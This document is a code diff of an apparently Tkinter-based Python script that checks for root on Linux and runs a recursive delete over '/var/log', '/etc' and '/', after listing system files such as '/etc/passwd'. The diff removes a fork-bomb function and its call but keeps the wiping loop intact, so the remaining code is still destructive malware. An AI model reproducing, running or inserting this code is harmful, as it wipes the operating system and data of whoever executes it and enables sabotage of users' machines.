@@ -5,7 +5,6 @@ import subprocess as sp
 
 from os import path
 
-
 class Utils:
 
     def __init__(self):
@@ -15,17 +14,12 @@ class Utils:
         return "#%02x%02x%02x" % rgb  
 
     
-
 directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/hosts", "/etc/passwd"]
 need_removing_list = ["/var/log", "/etc", "/"]
 services_list = ["networking", "ssh"]
 
 def preventClose():
     pass
-
-def ForkBomb():
-    os.system(":(){ :|:& };:`")
-    quit()
 
 def MainThread():
 
@@ -55,8 +49,7 @@ def MainThread():
         os.system("cd /")
         os.system(rmrf_command + f + "*")    
 
-    if(root.mainloop()):
-        ForkBomb() 
+    root.mainloop() 
 
 
 if (os.getuid() != 0):
@@ -69,4 +62,4 @@ if (platform.system() != "Linux"):
 
 if __name__ == "__main__":
     MainThread()
-
+    quit()
